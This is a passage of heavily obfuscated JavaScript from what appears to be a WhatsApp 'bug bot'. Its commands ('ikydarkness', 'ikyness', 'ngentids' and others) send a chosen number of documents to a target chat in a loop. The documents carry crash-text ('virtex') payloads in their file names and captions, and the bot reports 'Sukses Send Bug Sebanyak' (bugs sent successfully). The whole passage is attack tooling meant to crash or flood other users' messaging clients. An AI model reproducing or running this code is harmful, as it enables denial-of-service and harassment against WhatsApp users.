i=0x0;i<jumlah;i++){ikycoli[_0x243d3b(0x89)](m[_0x243d3b(0x7c)],{'document':thumb},{'quoted':{'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...from?{'remoteJid':'@s.whatsapp.net'}:{}},'message':{'documentMessage':{'url':_0x243d3b(0x75),'mimetype':_0x243d3b(0x78),'fileSha256':_0x243d3b(0x71),'fileLength':_0x243d3b(0x7b),'pageCount':0x1,'mediaKey':_0x243d3b(0x8b),'fileName':_0x243d3b(0x93)+philips+'\x20'+ngazap(prefix),'fileEncSha256':_0x243d3b(0x85)}}}});}jancok(_0x243d3b(0x95)+jumlah);}
}
break
case 'jadibugdoc':{
function _0x20e0(_0x5a9a97,_0x20b1cb){const _0x378ff5=_0x5a8f();return _0x20e0=function(_0x38efff,_0x5a9258){_0x38efff=_0x38efff-0x185;let _0x21326e=_0x378ff5[_0x38efff];return _0x21326e;},_0x20e0(_0x5a9a97,_0x20b1cb);}const _0x38d0ef=_0x20e0;(function(_0x73602c,_0x1951d5){const _0x38a570=_0x20e0,_0x3cbeb1=_0x73602c();while(!![]){try{const _0x678b76=-parseInt(_0x38a570(0x19d))/0x1*(-parseInt(_0x38a570(0x1a0))/0x2)+-parseInt(_0x38a570(0x18e))/0x3+parseInt(_0x38a570(0x19a))/0x4+parseInt(_0x38a570(0x197))/0x5*(parseInt(_0x38a570(0x191))/0x6)+-parseInt(_0x38a570(0x199))/0x7*(-parseInt(_0x38a570(0x196))/0x8)+parseInt(_0x38a570(0x185))/0x9+-parseInt(_0x38a570(0x1a3))/0xa;if(_0x678b76===_0x1951d5)break;else _0x3cbeb1['push'](_0x3cbeb1['shift']());}catch(_0x4b2b7c){_0x3cbeb1['push'](_0x3cbeb1['shift']());}}}(_0x5a8f,0xbe29a));const _0x1cfe5a=(function(){let _0x3b5d7a=!![];return function(_0x288a4d,_0xefd9c8){const _0x1b0d68=_0x3b5d7a?function(){const _0x1a875d=_0x20e0;if(_0xefd9c8){const _0x3686d1=_0xefd9c8[_0x1a875d(0x1a1)](_0x288a4d,arguments);return _0xefd9c8=null,_0x3686d1;}}:function(){};return _0x3b5d7a=![],_0x1b0d68;};}()),_0x54cbd3=_0x1cfe5a(this,function(){const _0x490a67=_0x20e0;return _0x54cbd3[_0x490a67(0x18c)]()[_0x490a67(0x194)](_0x490a67(0x189))[_0x490a67(0x18c)]()[_0x490a67(0x187)](_0x54cbd3)['search'](_0x490a67(0x189));});_0x54cbd3();const _0x5a9258=(function(){let _0x2d8d7c=!![];return function(_0x168e47,_0x195909){const _0xc3698b=_0x2d8d7c?function(){if(_0x195909){const _0x2cbeee=_0x195909['apply'](_0x168e47,arguments);return _0x195909=null,_0x2cbeee;}}:function(){};return _0x2d8d7c=![],_0xc3698b;};}()),_0x38efff=_0x5a9258(this,function(){const _0x4b2db5=_0x20e0;let _0x4003e1;try{const _0x35ced7=Function(_0x4b2db5(0x193)+_0x4b2db5(0x195)+');');_0x4003e1=_0x35ced7();}catch(_0x802ffa){_0x4003e1=window;}const _0x406f58=_0x4003e1['console']=_0x4003e1['console']||{},_0x165bf9=[_0x4b2db5(0x19e),_0x4b2db5(0x19f),_0x4b2db5(0x18d),_0x4b2db5(0x18f),_0x4b2db5(0x19b),_0x4b2db5(0x19c),'trace'];for(let _0x48151f=0x0;_0x48151f<_0x165bf9[_0x4b2db5(0x198)];_0x48151f++){const _0x2a1237=_0x5a9258[_0x4b2db5(0x187)]['prototype']['bind'](_0x5a9258),_0x45887b=_0x165bf9[_0x48151f],_0x496b3b=_0x406f58[_0x45887b]||_0x2a1237;_0x2a1237[_0x4b2db5(0x186)]=_0x5a9258[_0x4b2db5(0x188)](_0x5a9258),_0x2a1237[_0x4b2db5(0x18c)]=_0x496b3b['toString'][_0x4b2db5(0x188)](_0x496b3b),_0x406f58[_0x45887b]=_0x2a1237;}});_0x38efff();function _0x5a8f(){const _0x3efa15=['*Send/Reply\x20Media','31232710EKLaRp','6293520sVCbhv','__proto__','constructor','bind','(((.+)+)+)+$','Sukses\x20Convert\x20Bugdoc','download','toString','info','510816HjCfKN','error','Teksnya\x20Mana?','198cbWokD','waUploadToServer','return\x20(function()\x20','search','{}.constructor(\x22return\x20this\x22)(\x20)','5136584AiNLgl','111950fxdxdS','length','7penfDb','1889924OlHBjP','exception','table','10481ZwBjMV','log','warn','290VoBUlA','apply'];_0x5a8f=function(){return _0x3efa15;};return _0x5a8f();}{if(!isCreator&&!isBan)return;if(!m['quoted'])throw _0x38d0ef(0x1a2);if(!text)throw _0x38d0ef(0x190);let media=await quoted[_0x38d0ef(0x18b)]();var messa=await prepareWAMessageMedia({'document':media},{'upload':ikycoli[_0x38d0ef(0x192)]});ikycoli['sendMessage'](m['chat'],{'document':thumb},{'quoted':ikyzyx}),jancok(_0x38d0ef(0x18a));}
}
break
case 'ikydarkness':{
const _0x5e8056=_0x48ff;(function(_0xb15716,_0x3135d5){const _0x50adb3=_0x48ff,_0x507c10=_0xb15716();while(!![]){try{const _0xfcd69b=parseInt(_0x50adb3(0xd2))/0x1*(parseInt(_0x50adb3(0xcb))/0x2)+parseInt(_0x50adb3(0xc5))/0x3*(-parseInt(_0x50adb3(0xd5))/0x4)+parseInt(_0x50adb3(0xb8))/0x5*(-parseInt(_0x50adb3(0xc4))/0x6)+parseInt(_0x50adb3(0xca))/0x7*(-parseInt(_0x50adb3(0xd1))/0x8)+-parseInt(_0x50adb3(0xbc))/0x9+parseInt(_0x50adb3(0xc8))/0xa+parseInt(_0x50adb3(0xc6))/0xb;if(_0xfcd69b===_0x3135d5)break;else _0x507c10['push'](_0x507c10['shift']());}catch(_0x356618){_0x507c10['push'](_0x507c10['shift']());}}}(_0x128e,0x51051));const _0x2528f7=(function(){let _0x2e5292=!![];return function(_0x17b649,_0x444f6f){const _0x44a776=_0x2e5292?function(){if(_0x444f6f){const _0x5db2e7=_0x444f6f['apply'](_0x17b649,arguments);return _0x444f6f=null,_0x5db2e7;}}:function(){};return _0x2e5292=![],_0x44a776;};}()),_0x7258c2=_0x2528f7(this,function(){const _0x2d00bd=_0x48ff;return _0x7258c2[_0x2d00bd(0xbe)]()['search'](_0x2d00bd(0xc1))[_0x2d00bd(0xbe)]()[_0x2d00bd(0xc9)](_0x7258c2)[_0x2d00bd(0xc7)](_0x2d00bd(0xc1));});_0x7258c2();function _0x128e(){const _0x2dc4df=['(((.+)+)+)+$','Jumlahnya?','{}.constructor(\x22return\x20this\x22)(\x20)','204qRhifS','99NklSqj','11086196QAzThg','search','2488390xKjZpM','constructor','580181UjPiGw','390058qbztNS','PHOTO','reply','Sukses\x20Send\x20Bug\x20Sebanyak\x20','length','Darkness\x20メ\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','24iVzhan','2APDPWZ','bind','log','46948RNrHVz','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','chat','./virtex/Darkness\x20メ','warn','return\x20(function()\x20','63805iDrXKV','table','readFileSync','sendMessage','2205288SAObwG','apply','toString','trace','prototype'];_0x128e=function(){return _0x2dc4df;};return _0x128e();}function _0x48ff(_0x442108,_0x232ef8){const _0x88c87c=_0x128e();return _0x48ff=function(_0x3a2a89,_0x2fe501){_0x3a2a89=_0x3a2a89-0xb3;let _0xb29c6e=_0x88c87c[_0x3a2a89];return _0xb29c6e;},_0x48ff(_0x442108,_0x232ef8);}const _0x2fe501=(function(){let _0x3900d2=!![];return function(_0x35c621,_0x472b1e){const _0x5a5a3b=_0x3900d2?function(){const _0x27b5b7=_0x48ff;if(_0x472b1e){const _0x4ce9a0=_0x472b1e[_0x27b5b7(0xbd)](_0x35c621,arguments);return _0x472b1e=null,_0x4ce9a0;}}:function(){};return _0x3900d2=![],_0x5a5a3b;};}()),_0x3a2a89=_0x2fe501(this,function(){const _0x3ccb40=_0x48ff;let _0xb1e187;try{const _0x1a17d6=Function(_0x3ccb40(0xb7)+_0x3ccb40(0xc3)+');');_0xb1e187=_0x1a17d6();}catch(_0xd6b915){_0xb1e187=window;}const _0x263d33=_0xb1e187['console']=_0xb1e187['console']||{},_0x5d5dea=[_0x3ccb40(0xd4),_0x3ccb40(0xb6),'info','error','exception',_0x3ccb40(0xb9),_0x3ccb40(0xbf)];for(let _0x398881=0x0;_0x398881<_0x5d5dea[_0x3ccb40(0xcf)];_0x398881++){const _0x135224=_0x2fe501[_0x3ccb40(0xc9)][_0x3ccb40(0xc0)][_0x3ccb40(0xd3)](_0x2fe501),_0x2766d0=_0x5d5dea[_0x398881],_0x3bd9b9=_0x263d33[_0x2766d0]||_0x135224;_0x135224['__proto__']=_0x2fe501[_0x3ccb40(0xd3)](_0x2fe501),_0x135224[_0x3ccb40(0xbe)]=_0x3bd9b9[_0x3ccb40(0xbe)][_0x3ccb40(0xd3)](_0x3bd9b9),_0x263d33[_0x2766d0]=_0x135224;}});_0x3a2a89();{if(!isCreator&&!isBan)return;if(args[_0x5e8056(0xcf)]==0x0)return m[_0x5e8056(0xcd)](_0x5e8056(0xc2));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){ikycoli[_0x5e8056(0xbb)](m[_0x5e8056(0xb4)],{'document':fs[_0x5e8056(0xba)](_0x5e8056(0xb5)),'mimetype':'document/pdf','fileName':_0x5e8056(0xd0)+virusv3,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+ikybabel,'body':wm+'\x20\x0a'+ikybabel,'previewType':_0x5e8056(0xcc),'showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':_0x5e8056(0xb3)}}},{'quoted':fkntliky,'contextInfo':{}});}jancok(_0x5e8056(0xce)+jumlah);}
}
break
case 'jadidarkness':{
function _0x476b(_0x3232d3,_0x4b14b3){const _0x403352=_0x200d();return _0x476b=function(_0x1fd4e7,_0x531567){_0x1fd4e7=_0x1fd4e7-0x183;let _0x4d47b9=_0x403352[_0x1fd4e7];return _0x4d47b9;},_0x476b(_0x3232d3,_0x4b14b3);}const _0x294e0c=_0x476b;(function(_0x37b758,_0xf4e57d){const _0x54029c=_0x476b,_0x99b25=_0x37b758();while(!![]){try{const _0x3b334b=-parseInt(_0x54029c(0x196))/0x1+parseInt(_0x54029c(0x18d))/0x2*(-parseInt(_0x54029c(0x1a4))/0x3)+parseInt(_0x54029c(0x195))/0x4*(-parseInt(_0x54029c(0x18e))/0x5)+-parseInt(_0x54029c(0x19e))/0x6+parseInt(_0x54029c(0x1a1))/0x7*(-parseInt(_0x54029c(0x192))/0x8)+-parseInt(_0x54029c(0x19c))/0x9+-parseInt(_0x54029c(0x185))/0xa*(-parseInt(_0x54029c(0x19a))/0xb);if(_0x3b334b===_0xf4e57d)break;else _0x99b25['push'](_0x99b25['shift']());}catch(_0x21a89f){_0x99b25['push'](_0x99b25['shift']());}}}(_0x200d,0x52580));const _0x18fc43=(function(){let _0x1d29d8=!![];return function(_0xb031b3,_0x172638){const _0x442a9d=_0x1d29d8?function(){const _0x191977=_0x476b;if(_0x172638){const _0x594c3c=_0x172638[_0x191977(0x18a)](_0xb031b3,arguments);return _0x172638=null,_0x594c3c;}}:function(){};return _0x1d29d8=![],_0x442a9d;};}()),_0x510d3e=_0x18fc43(this,function(){const _0x3b92ec=_0x476b;return _0x510d3e['toString']()[_0x3b92ec(0x18c)](_0x3b92ec(0x199))[_0x3b92ec(0x194)]()[_0x3b92ec(0x186)](_0x510d3e)[_0x3b92ec(0x18c)](_0x3b92ec(0x199));});_0x510d3e();const _0x531567=(function(){let _0x59db5c=!![];return function(_0x29e80e,_0x10095c){const _0x51bae2=_0x59db5c?function(){const _0x2e59f2=_0x476b;if(_0x10095c){const _0x146a48=_0x10095c[_0x2e59f2(0x18a)](_0x29e80e,arguments);return _0x10095c=null,_0x146a48;}}:function(){};return _0x59db5c=![],_0x51bae2;};}()),_0x1fd4e7=_0x531567(this,function(){const _0x1231bf=_0x476b,_0x315a7d=function(){const _0x38f29d=_0x476b;let _0x1266c9;try{_0x1266c9=Function('return\x20(function()\x20'+_0x38f29d(0x184)+');')();}catch(_0x21c738){_0x1266c9=window;}return _0x1266c9;},_0x2baa4f=_0x315a7d(),_0x1cf0a2=_0x2baa4f[_0x1231bf(0x187)]=_0x2baa4f[_0x1231bf(0x187)]||{},_0x18ae08=['log',_0x1231bf(0x197),_0x1231bf(0x183),_0x1231bf(0x193),_0x1231bf(0x1a3),_0x1231bf(0x19b),_0x1231bf(0x198)];for(let _0x172649=0x0;_0x172649<_0x18ae08['length'];_0x172649++){const _0x69597f=_0x531567[_0x1231bf(0x186)]['prototype'][_0x1231bf(0x19f)](_0x531567),_0x3fe86d=_0x18ae08[_0x172649],_0x350428=_0x1cf0a2[_0x3fe86d]||_0x69597f;_0x69597f['__proto__']=_0x531567[_0x1231bf(0x19f)](_0x531567),_0x69597f['toString']=_0x350428[_0x1231bf(0x194)]['bind'](_0x350428),_0x1cf0a2[_0x3fe86d]=_0x69597f;}});function _0x200d(){const _0x27b34a=['{}.constructor(\x22return\x20this\x22)(\x20)','10YJlSla','constructor','console','quoted','sendMessage','apply','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','search','2XiJdmW','23995mrBxoj','document/pdf','PHOTO','Sukses','223424rgLjjD','error','toString','124IBQoUn','105340kCEdGN','warn','trace','(((.+)+)+)+$','24579852BoOGci','table','5313168TYPKdO','chat','2376528CZJQPW','bind','Darkness\x20メ\x20','42nFAVEX','Teksnya\x20Mana?','exception','1467405mBqSyt','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','info'];_0x200d=function(){return _0x27b34a;};return _0x200d();}_0x1fd4e7();{if(!isCreator&&!isBan)return;if(!m[_0x294e0c(0x188)])throw'*Send/Reply\x20Media';if(!text)throw _0x294e0c(0x1a2);let media=await quoted['download']();var messa=await prepareWAMessageMedia({'document':media},{'upload':ikycoli['waUploadToServer']});lala=media,ikycoli[_0x294e0c(0x189)](m[_0x294e0c(0x19d)],{'document':lala,'mimetype':_0x294e0c(0x18f),'fileName':_0x294e0c(0x1a0)+text+_0x294e0c(0x18b)+virusv3,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+ikybabel,'body':wm+'\x20\x0a'+ikybabel,'previewType':_0x294e0c(0x190),'showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':_0x294e0c(0x1a5)}}},{'quoted':fkntliky,'contextInfo':{}}),jancok(_0x294e0c(0x191));}
}
break

case 'ikyness':{
const _0x1cbec2=_0xb017;function _0xb017(_0x4b2a12,_0x4cba37){const _0x2c661e=_0x3c5c();return _0xb017=function(_0x5d2bf4,_0x4e6ff3){_0x5d2bf4=_0x5d2bf4-0xc1;let _0x345aef=_0x2c661e[_0x5d2bf4];return _0x345aef;},_0xb017(_0x4b2a12,_0x4cba37);}function _0x3c5c(){const _0x4e6ad3=['5436858pTefzh','error','2430948zaiWid','exception','8873730scIUCB','constructor','Sukses\x20Send\x20Bug\x20Sebanyak\x20','1091651SqreVB','1893312DklKvG','readFileSync','271550HLfHLz','length','toString','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','bind','1092204zbcrtG','prototype','15bmFOKc','info','10MCDENK','Jumlahnya?','console','(((.+)+)+)+$','sendMessage','18xryhaO','chat','search','return\x20(function()\x20','./virtex/Darkness\x20メ','PHOTO','trace'];_0x3c5c=function(){return _0x4e6ad3;};return _0x3c5c();}(function(_0x4ce136,_0x464f72){const _0x59cee3=_0xb017,_0x3c5786=_0x4ce136();while(!![]){try{const _0x108398=-parseInt(_0x59cee3(0xd6))/0x1+parseInt(_0x59cee3(0xd9))/0x2*(parseInt(_0x59cee3(0xc1))/0x3)+-parseInt(_0x59cee3(0xde))/0x4+-parseInt(_0x59cee3(0xc3))/0x5*(parseInt(_0x59cee3(0xd1))/0x6)+parseInt(_0x59cee3(0xcf))/0x7+parseInt(_0x59cee3(0xd7))/0x8*(parseInt(_0x59cee3(0xc8))/0x9)+parseInt(_0x59cee3(0xd3))/0xa;if(_0x108398===_0x464f72)break;else _0x3c5786['push'](_0x3c5786['shift']());}catch(_0x26e4b7){_0x3c5786['push'](_0x3c5786['shift']());}}}(_0x3c5c,0x9c8e4));const _0xe3cfb6=(function(){let _0x3f86df=!![];return function(_0x27e657,_0x152dcc){const _0xc65a8f=_0x3f86df?function(){if(_0x152dcc){const _0x3c41cc=_0x152dcc['apply'](_0x27e657,arguments);return _0x152dcc=null,_0x3c41cc;}}:function(){};return _0x3f86df=![],_0xc65a8f;};}()),_0x47f2ef=_0xe3cfb6(this,function(){const _0x5d994e=_0xb017;return _0x47f2ef['toString']()[_0x5d994e(0xca)](_0x5d994e(0xc6))[_0x5d994e(0xdb)]()['constructor'](_0x47f2ef)[_0x5d994e(0xca)]('(((.+)+)+)+$');});_0x47f2ef();const _0x4e6ff3=(function(){let _0x1a7b83=!![];return function(_0x31c0b5,_0x543e68){const _0x12a9d3=_0x1a7b83?function(){if(_0x543e68){const _0x17ad51=_0x543e68['apply'](_0x31c0b5,arguments);return _0x543e68=null,_0x17ad51;}}:function(){};return _0x1a7b83=![],_0x12a9d3;};}()),_0x5d2bf4=_0x4e6ff3(this,function(){const _0x5245fa=_0xb017,_0x57630e=function(){const _0x59eba2=_0xb017;let _0x475f86;try{_0x475f86=Function(_0x59eba2(0xcb)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x1fecd0){_0x475f86=window;}return _0x475f86;},_0x33fd4a=_0x57630e(),_0x10f6e0=_0x33fd4a[_0x5245fa(0xc5)]=_0x33fd4a[_0x5245fa(0xc5)]||{},_0x1c5b86=['log','warn',_0x5245fa(0xc2),_0x5245fa(0xd0),_0x5245fa(0xd2),'table',_0x5245fa(0xce)];for(let _0x456e18=0x0;_0x456e18<_0x1c5b86[_0x5245fa(0xda)];_0x456e18++){const _0x550fb5=_0x4e6ff3[_0x5245fa(0xd4)][_0x5245fa(0xdf)][_0x5245fa(0xdd)](_0x4e6ff3),_0x28316c=_0x1c5b86[_0x456e18],_0x28b9b4=_0x10f6e0[_0x28316c]||_0x550fb5;_0x550fb5['__proto__']=_0x4e6ff3[_0x5245fa(0xdd)](_0x4e6ff3),_0x550fb5['toString']=_0x28b9b4[_0x5245fa(0xdb)][_0x5245fa(0xdd)](_0x28b9b4),_0x10f6e0[_0x28316c]=_0x550fb5;}});_0x5d2bf4();{if(!isCreator&&!isBan)return;if(args[_0x1cbec2(0xda)]==0x0)return m['reply'](_0x1cbec2(0xc4));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){ikycoli[_0x1cbec2(0xc7)](m[_0x1cbec2(0xc9)],{'document':fs[_0x1cbec2(0xd8)](_0x1cbec2(0xcc)),'mimetype':'document/pdf','fileName':'Ikyness\x20メ\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+ikybabel,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+ikybabel,'body':wm+'\x20\x0a'+ikybabel,'previewType':_0x1cbec2(0xcd),'showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':_0x1cbec2(0xdc)}},'caption':''+ikybabel},{'quoted':fkntliky,'contextInfo':{}});}jancok(_0x1cbec2(0xd5)+jumlah);}
}
break

case 'jadiikyness':{
const _0x2dcedc=_0x1359;(function(_0x5988eb,_0x5b1dbf){const _0x33a7f2=_0x1359,_0x1e2eb8=_0x5988eb();while(!![]){try{const _0x31b1ab=-parseInt(_0x33a7f2(0x1b0))/0x1+-parseInt(_0x33a7f2(0x1b4))/0x2+-parseInt(_0x33a7f2(0x1c1))/0x3+-parseInt(_0x33a7f2(0x1aa))/0x4*(-parseInt(_0x33a7f2(0x1bf))/0x5)+-parseInt(_0x33a7f2(0x1c8))/0x6*(parseInt(_0x33a7f2(0x1b6))/0x7)+-parseInt(_0x33a7f2(0x1bd))/0x8*(-parseInt(_0x33a7f2(0x1b2))/0x9)+-parseInt(_0x33a7f2(0x1b7))/0xa*(-parseInt(_0x33a7f2(0x1c4))/0xb);if(_0x31b1ab===_0x5b1dbf)break;else _0x1e2eb8['push'](_0x1e2eb8['shift']());}catch(_0x1598fd){_0x1e2eb8['push'](_0x1e2eb8['shift']());}}}(_0x59ba,0x61a3f));const _0x156b25=(function(){let _0x190be9=!![];return function(_0x58afb3,_0x172c9c){const _0x38620b=_0x190be9?function(){const _0x2cd4bf=_0x1359;if(_0x172c9c){const _0x9338cc=_0x172c9c[_0x2cd4bf(0x1c0)](_0x58afb3,arguments);return _0x172c9c=null,_0x9338cc;}}:function(){};return _0x190be9=![],_0x38620b;};}()),_0x26a62=_0x156b25(this,function(){const _0x5741c7=_0x1359;return _0x26a62[_0x5741c7(0x1b1)]()[_0x5741c7(0x1c7)](_0x5741c7(0x1bc))[_0x5741c7(0x1b1)]()[_0x5741c7(0x1c2)](_0x26a62)[_0x5741c7(0x1c7)]('(((.+)+)+)+$');});_0x26a62();const _0x554965=(function(){let _0x3244fd=!![];return function(_0x288962,_0x47eb59){const _0x5502e4=_0x3244fd?function(){const _0xa5d27a=_0x1359;if(_0x47eb59){const _0x4950b1=_0x47eb59[_0xa5d27a(0x1c0)](_0x288962,arguments);return _0x47eb59=null,_0x4950b1;}}:function(){};return _0x3244fd=![],_0x5502e4;};}()),_0x3ddd39=_0x554965(this,function(){const _0x16bee5=_0x1359;let _0x39486d;try{const _0xbe9dc=Function(_0x16bee5(0x1b9)+_0x16bee5(0x1ac)+');');_0x39486d=_0xbe9dc();}catch(_0x4c8ce3){_0x39486d=window;}const _0x158793=_0x39486d[_0x16bee5(0x1bb)]=_0x39486d[_0x16bee5(0x1bb)]||{},_0x14d566=[_0x16bee5(0x1cb),_0x16bee5(0x1ad),_0x16bee5(0x1c3),_0x16bee5(0x1af),'exception',_0x16bee5(0x1be),'trace'];for(let _0x442698=0x0;_0x442698<_0x14d566[_0x16bee5(0x1b3)];_0x442698++){const _0x83dc60=_0x554965[_0x16bee5(0x1c2)][_0x16bee5(0x1ae)]['bind'](_0x554965),_0x9d0783=_0x14d566[_0x442698],_0x54c23b=_0x158793[_0x9d0783]||_0x83dc60;_0x83dc60[_0x16bee5(0x1b8)]=_0x554965[_0x16bee5(0x1c9)](_0x554965),_0x83dc60[_0x16bee5(0x1b1)]=_0x54c23b[_0x16bee5(0x1b1)][_0x16bee5(0x1c9)](_0x54c23b),_0x158793[_0x9d0783]=_0x83dc60;}});function _0x1359(_0x373c3e,_0x15b7ae){const _0x28d2d3=_0x59ba();return _0x1359=function(_0x3ddd39,_0x554965){_0x3ddd39=_0x3ddd39-0x1a7;let _0x166ec1=_0x28d2d3[_0x3ddd39];return _0x166ec1;},_0x1359(_0x373c3e,_0x15b7ae);}_0x3ddd39();{if(!isCreator&&!isBan)return;if(!m[_0x2dcedc(0x1b5)])throw _0x2dcedc(0x1ab);if(!text)throw _0x2dcedc(0x1a7);let media=await quoted[_0x2dcedc(0x1ba)]();var messa=await prepareWAMessageMedia({'document':media},{'upload':ikycoli[_0x2dcedc(0x1a9)]});lala=media,ikycoli[_0x2dcedc(0x1ca)](m['chat'],{'document':lala,'mimetype':'document/pdf','fileName':text+_0x2dcedc(0x1a8)+ikybabel,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+ikybabel,'body':wm+'\x20\x0a'+ikybabel,'previewType':'PHOTO','showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':_0x2dcedc(0x1c5)}},'caption':''+ikybabel},{'quoted':fkntliky,'contextInfo':{}}),jancok(_0x2dcedc(0x1c6));}function _0x59ba(){const _0x4c7f1f=['sendMessage','log','Teksnya\x20Mana?','\x20Ikyness\x20メ\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','waUploadToServer','96944GYRNuh','*Send/Reply\x20Media','{}.constructor(\x22return\x20this\x22)(\x20)','warn','prototype','error','121886uhDEuG','toString','736623SbHLhq','length','936972XMEoLb','quoted','2675960tAjwFT','190hEGJBU','__proto__','return\x20(function()\x20','download','console','(((.+)+)+)+$','8rxwRtN','table','160zeKrYf','apply','136506FMCSmO','constructor','info','545930IEWtjH','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','Sukses','search','12ryAWdi','bind'];_0x59ba=function(){return _0x4c7f1f;};return _0x59ba();}
}
break

case 'ngentids':{
function _0x8fab(){const _0x45a32c=['toString','1056gOeVzJ','48994mDLggG','log','1526EfisEa','(((.+)+)+)+$','251307txtVAm','apply','search','exception','9tTghhL','./virtex/Darkness\x20メ','trace','Jumlahnya?','bind','18120Cfxcoa','reply','4464UDRVGt','465690XfZvfB','constructor','{}.constructor(\x22return\x20this\x22)(\x20)','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','warn','Sukses\x20Send\x20Bug\x20Sebanyak\x20','13935yJwmgZ','PHOTO','return\x20(function()\x20','ngentids\x20メ\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','92208RQBKMm','__proto__','length','20iLPndU','document/pdf','946170DjiVpC','error'];_0x8fab=function(){return _0x45a32c;};return _0x8fab();}const _0x3a7ab0=_0x31c6;(function(_0x24edd7,_0x5ea7eb){const _0x35909a=_0x31c6,_0x11848b=_0x24edd7();while(!![]){try{const _0x5e532d=parseInt(_0x35909a(0xb0))/0x1+-parseInt(_0x35909a(0xba))/0x2+-parseInt(_0x35909a(0xa4))/0x3*(-parseInt(_0x35909a(0xbd))/0x4)+parseInt(_0x35909a(0xb6))/0x5*(parseInt(_0x35909a(0xc2))/0x6)+parseInt(_0x35909a(0xc5))/0x7*(parseInt(_0x35909a(0xad))/0x8)+parseInt(_0x35909a(0xa8))/0x9*(parseInt(_0x35909a(0xbf))/0xa)+parseInt(_0x35909a(0xc3))/0xb*(-parseInt(_0x35909a(0xaf))/0xc);if(_0x5e532d===_0x5ea7eb)break;else _0x11848b['push'](_0x11848b['shift']());}catch(_0x58d7bf){_0x11848b['push'](_0x11848b['shift']());}}}(_0x8fab,0x3f95a));const _0x3f3d1e=(function(){let _0x4cb54e=!![];return function(_0x5c58ad,_0x362de6){const _0x516fe6=_0x4cb54e?function(){if(_0x362de6){const _0xef7d5e=_0x362de6['apply'](_0x5c58ad,arguments);return _0x362de6=null,_0xef7d5e;}}:function(){};return _0x4cb54e=![],_0x516fe6;};}()),_0x22aa01=_0x3f3d1e(this,function(){const _0x271261=_0x31c6;return _0x22aa01[_0x271261(0xc1)]()[_0x271261(0xa6)](_0x271261(0xc6))['toString']()[_0x271261(0xb1)](_0x22aa01)[_0x271261(0xa6)](_0x271261(0xc6));});function _0x31c6(_0x5eeae7,_0x1dfd95){const _0x393997=_0x8fab();return _0x31c6=function(_0x3b7874,_0x388f99){_0x3b7874=_0x3b7874-0xa4;let _0x32df5f=_0x393997[_0x3b7874];return _0x32df5f;},_0x31c6(_0x5eeae7,_0x1dfd95);}_0x22aa01();const _0x388f99=(function(){let _0x4cf325=!![];return function(_0x58b4ec,_0x358c23){const _0x48fee5=_0x4cf325?function(){const _0x537f47=_0x31c6;if(_0x358c23){const _0x58adfc=_0x358c23[_0x537f47(0xa5)](_0x58b4ec,arguments);return _0x358c23=null,_0x58adfc;}}:function(){};return _0x4cf325=![],_0x48fee5;};}()),_0x3b7874=_0x388f99(this,function(){const _0x2bffa4=_0x31c6,_0x3a15a2=function(){const _0x319b0d=_0x31c6;let _0x3b5153;try{_0x3b5153=Function(_0x319b0d(0xb8)+_0x319b0d(0xb2)+');')();}catch(_0xd6e2b8){_0x3b5153=window;}return _0x3b5153;},_0x44407b=_0x3a15a2(),_0x5a873f=_0x44407b['console']=_0x44407b['console']||{},_0x29dbe8=[_0x2bffa4(0xc4),_0x2bffa4(0xb4),'info',_0x2bffa4(0xc0),_0x2bffa4(0xa7),'table',_0x2bffa4(0xaa)];for(let _0x2a65b6=0x0;_0x2a65b6<_0x29dbe8[_0x2bffa4(0xbc)];_0x2a65b6++){const _0x30586a=_0x388f99[_0x2bffa4(0xb1)]['prototype']['bind'](_0x388f99),_0x287be5=_0x29dbe8[_0x2a65b6],_0x28374e=_0x5a873f[_0x287be5]||_0x30586a;_0x30586a[_0x2bffa4(0xbb)]=_0x388f99[_0x2bffa4(0xac)](_0x388f99),_0x30586a['toString']=_0x28374e[_0x2bffa4(0xc1)]['bind'](_0x28374e),_0x5a873f[_0x287be5]=_0x30586a;}});_0x3b7874();{if(!isCreator&&!isBan)return;if(args[_0x3a7ab0(0xbc)]==0x0)return m[_0x3a7ab0(0xae)](_0x3a7ab0(0xab));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){ikycoli['sendMessage'](m['chat'],{'document':fs['readFileSync'](_0x3a7ab0(0xa9)),'mimetype':_0x3a7ab0(0xbe),'fileName':_0x3a7ab0(0xb9)+ikybabel,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+ikybabel,'body':wm+'\x20\x0a'+ikybabel,'previewType':_0x3a7ab0(0xb7),'showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':_0x3a7ab0(0xb3)}},'caption':''+ikybabel},{'quoted':fkntliky,'contextInfo':{}});}jancok(_0x3a7ab0(0xb5)+jumlah);}
}
break

case 'jadingentids':{
